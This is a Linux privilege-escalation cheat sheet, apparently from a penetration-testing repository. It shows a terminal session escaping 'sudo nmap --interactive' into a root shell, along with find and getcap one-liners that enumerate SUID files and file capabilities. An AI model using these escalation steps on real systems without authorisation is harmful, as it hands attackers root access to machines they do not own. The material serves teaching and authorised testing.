# LINUX
This sheet serves as a resource for processes commonly used to escalate privileges of a low-privilege user access during the post-exploitation phase of the penetration test.
## Run the LINUX Privilege Checker Python Script
If Python is installed, **make sure that this script is ran immediately** [LinuxPrivChecker Python script](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Tools/linuxprivchecker.py) upon gaining low-level access to a target system. This script will provide quick insight into possible misconfigurations in the target system.

## SUDO Test
Testing for sudo will sometimes reveal a nice surprise. The [LinuxPrivChecker Python script](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Tools/linuxprivchecker.py) will tell you exactly which commands/programs are installed with interactive shells that can be escaped from. For instance, some older version of `nmap` had a interactivbe shell. This meant that on certain systems in which a default account has non-authenticated sudo access to it, it could easily lead to a root shell.

```
bash-3.2$ ls -lah /usr/bin/nmap
ls -lah /usr/bin/nmap
-rwxr-xr-x 1 root root 523K Jan  6  2007 /usr/bin/nmap
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> ! /bin/bash
! /bin/bash
bash-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash-3.2# 
```
So, it is **very important** that all of these are tested with sudo.

## SUID Test
Some of the aforementioned applciations which can be escaped from may have a SUID bit set in the permissions. This means that the effective user ID becomes that of the file's owner. **Again, test all of these** applications, **without sudo** if the attack above is unsuccessful because some of the file permissions may not be set correctly. You'd be surprised.

```
root@attacker-machine:~# find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
```
## Capabilities
Sometimes files have extra capabilities. To find special capabilities on files, you can try using the `getcap` command on every file in the file system. This can be very slow on actual physical machines - but for VMs and solid state drives, it shouldn't be too bad. You can utilize the `find` command to do this as so,
```
root@attacker-machine:~# find . * 2>/dev/null | xargs -I {} getcap {} 2>/dev/null
```
